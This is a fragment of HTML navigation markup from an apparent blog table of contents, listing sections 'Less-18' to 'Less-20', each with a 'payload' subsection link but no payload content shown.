<span class="nav-text">Less-18</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-7"><span class="nav-number">8.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-19"><span class="nav-number">9.</span> <span class="nav-text">Less-19</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-8"><span class="nav-number">9.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-20"><span class="nav-number">10.</span> <span class="nav-text">Less-20</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-9"><span class="nav-number">10.1.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></div>
             
 
           </div>
